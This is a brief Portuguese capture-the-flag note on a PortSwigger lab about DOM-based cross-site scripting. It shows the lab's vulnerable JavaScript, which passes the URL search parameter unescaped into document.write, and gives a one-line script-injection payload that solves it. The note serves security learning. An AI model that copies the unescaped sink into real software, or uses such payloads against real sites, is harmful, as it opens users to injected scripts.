#ctf 

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink

Ao fazer uma pesquisa existe uma função que lança um `<img>` na DOM.

```javascript
function trackSearch(query) {
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

Para resolver basta enviar este payload:

```
"'><script>alert(1)</script>
```
